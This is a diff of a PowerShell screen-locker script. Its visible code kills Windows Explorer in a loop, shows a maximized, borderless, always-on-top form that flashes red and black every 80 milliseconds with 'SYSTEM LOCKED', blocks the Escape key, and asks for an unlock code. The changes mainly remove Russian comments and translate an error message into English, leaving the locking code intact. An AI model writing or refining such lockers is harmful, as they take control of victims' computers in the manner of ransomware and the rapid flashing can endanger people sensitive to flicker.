@@ -4,7 +4,7 @@ Add-Type -AssemblyName PresentationFramework
 
 $global:Unlocked = $false
 
-# Фоновый блокировщик Explorer
+# Блокировщик Explorer
 $BlockExplorerJob = {
     while ($true) {
         $explorer = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
@@ -25,7 +25,6 @@ function Show-RedFlashingScreen {
     $form.BackColor = [System.Drawing.Color]::Red
     $form.KeyPreview = $true
 
-    # Большой текст в центре
     $mainLabel = New-Object System.Windows.Forms.Label
     $mainLabel.Text = "SYSTEM LOCKED"
     $mainLabel.ForeColor = [System.Drawing.Color]::White
@@ -33,7 +32,6 @@ function Show-RedFlashingScreen {
     $mainLabel.AutoSize = $true
     $form.Controls.Add($mainLabel)
 
-    # Инструкция снизу
     $spaceLabel = New-Object System.Windows.Forms.Label
     $spaceLabel.Text = "[ PRESS SPACE TO ENTER CODE ]"
     $spaceLabel.ForeColor = [System.Drawing.Color]::Yellow
@@ -41,7 +39,6 @@ function Show-RedFlashingScreen {
     $spaceLabel.AutoSize = $true
     $form.Controls.Add($spaceLabel)
 
-    # Центрирование элементов
     $form.Add_Resize({
         $mainLabel.Left = ($form.ClientSize.Width - $mainLabel.Width) / 2
         $mainLabel.Top = ($form.ClientSize.Height - $mainLabel.Height) / 2 - 50
@@ -49,9 +46,9 @@ function Show-RedFlashingScreen {
         $spaceLabel.Top = $form.ClientSize.Height - 80
     })
 
-    # Быстрое мигание красный <-> чёрный
+    # Быстрое мигание
     $timer = New-Object System.Windows.Forms.Timer
-    $timer.Interval = 80  # Очень быстрое мигание
+    $timer.Interval = 80
     $isRed = $true
     $timer.Add_Tick({
         if ($isRed) {
@@ -65,20 +62,18 @@ function Show-RedFlashingScreen {
     })
     $timer.Start()
 
-    # Обработка нажатия Space
     $form.Add_KeyDown({
         param($_, $e)
         if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Space) {
             $timer.Stop()
             $form.Close()
         }
-        # Блокировка Escape и других
         if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
             $e.Handled = $true
         }
     })
 
-    $form.Add_Shown({ 
+    $form.Add_Shown({
         $form.Activate()
         $mainLabel.Left = ($form.ClientSize.Width - $mainLabel.Width) / 2
         $mainLabel.Top = ($form.ClientSize.Height - $mainLabel.Height) / 2 - 50
@@ -95,7 +90,7 @@ function Show-PasswordWindow {
     $form.WindowState = "Maximized"
     $form.FormBorderStyle = "None"
     $form.TopMost = $true
-    $form.BackColor = [System.Drawing.Color]::FromArgb(20, 20, 40)  # Тёмно-синий
+    $form.BackColor = [System.Drawing.Color]::FromArgb(20, 20, 40)
     $form.KeyPreview = $true
 
     $panel = New-Object System.Windows.Forms.Panel
@@ -109,7 +104,6 @@ function Show-PasswordWindow {
         $panel.Top = ($form.ClientSize.Height - $panel.Height) / 2
     })
 
-    # Заголовок
     $titleLabel = New-Object System.Windows.Forms.Label
     $titleLabel.Text = "ENTER UNLOCK CODE"
     $titleLabel.ForeColor = [System.Drawing.Color]::Cyan
@@ -143,7 +137,7 @@ function Show-PasswordWindow {
             $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
             $form.Close()
         } else {
-            [System.Windows.Forms.MessageBox]::Show("НЕВЕРНЫЙ КОД!", "ERROR", 
+            [System.Windows.Forms.MessageBox]::Show("INCORRECT CODE!", "ERROR", 
                 [System.Windows.Forms.MessageBoxButtons]::OK, 
                 [System.Windows.Forms.MessageBoxIcon]::Error)
             $textBox.Clear()
@@ -153,7 +147,6 @@ function Show-PasswordWindow {
 
     $button.Add_Click($UnlockAction)
 
-    # Обработка клавиш
     $textBox.Add_KeyDown({
         param($_, $e)
         if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
